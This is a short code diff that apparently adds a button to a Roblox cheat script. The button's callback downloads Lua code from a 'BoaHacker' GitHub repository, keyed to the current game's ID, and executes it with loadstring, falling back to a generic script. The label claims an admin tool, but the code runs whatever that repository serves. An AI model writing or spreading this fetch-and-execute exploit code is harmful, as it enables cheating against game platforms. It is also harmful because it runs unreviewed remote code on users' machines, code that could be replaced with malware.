@@ -584,3 +584,19 @@ Event:FireServer(A_1, A_2, A_3, A_4, A_5, A_6, A_7)
 end)
    end,
 })
+
+local Button = MainTab:CreateButton({
+   Name = "Infinite yield(admin)",
+   Callback = function()
+local placeId = 'https://raw.githubusercontent.com/BoaHacker/ROBLOX/main/games/'.. game.PlaceId
+local found, notFound = pcall(function()
+	game:HttpGet(placeId)
+end)
+
+if placeId and found then
+	loadstring(game:HttpGet(placeId, true))()
+else
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/BoaHacker/ROBLOX/main/games/unknown', true))()
+end
+   end,
+})
